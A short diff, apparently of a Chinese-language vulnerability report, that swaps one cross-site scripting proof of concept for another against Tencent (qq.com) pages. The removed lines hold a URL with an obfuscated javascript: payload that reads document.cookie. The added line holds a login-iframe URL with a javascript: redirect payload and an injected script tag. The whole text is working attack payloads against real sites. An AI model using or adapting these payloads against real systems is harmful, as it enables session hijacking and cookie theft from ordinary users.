@@ -1,5 +1,1 @@
-1、访问 
-http://qzone-music.qq.com/client/v5/j.htm?#uin=a&key=a r_url=javas%0dcript:alert.call(null,document.cookie)//%23access_token%3Dx
-
-2、访问
-http://qzs.qq.com/open/mobile/login/proxy.html
+http://cf.qq.com/wx/loginIframe.htm?s_url=javascript:alert`999`#<script src="http://js.aq.qq.com/js/aq_common.js"></script>
